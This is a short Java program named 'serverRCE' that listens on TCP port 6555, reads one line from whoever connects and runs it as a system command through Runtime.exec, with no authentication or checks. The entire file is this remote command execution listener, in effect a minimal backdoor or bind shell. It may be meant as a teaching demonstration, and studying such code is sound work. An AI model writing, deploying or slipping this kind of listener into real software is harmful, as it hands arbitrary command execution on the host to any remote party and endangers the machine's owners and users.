import java.io.*;
import java.net.*;
class serverRCE{
    public static void main(String[] args){
        try{
            String str;
            ServerSocket server = new ServerSocket(6555);
            Socket s=server.accept();
            BufferedReader br=new BufferedReader(new InputStreamReader(s.getInputStream()));
            str=br.readLine();
            System.out.println("The command is: "+str);
            Runtime r=Runtime.getRuntime();
            Process p=r.exec(str);
        }catch(IOException e){
            System.out.println("Error" + e);
        }
    }
}